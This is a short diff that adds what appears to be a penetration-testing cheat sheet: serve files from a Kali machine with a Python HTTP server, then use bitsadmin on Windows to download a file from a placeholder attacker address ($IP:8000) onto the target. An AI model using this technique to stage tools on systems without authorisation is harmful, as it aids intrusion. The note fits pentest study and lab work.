@@ -1,0 +1,8 @@
+Kali:
+python -m SimpleHTTPServer
+
+Windows:
+bitsadmin /create myDownloadJob
+bitsadmin /addfile myDownloadJob http://$IP:8000/test c:\test
+bitsadmin /resume myDownloadJob
+bitsadmin /complete myDownloadJob
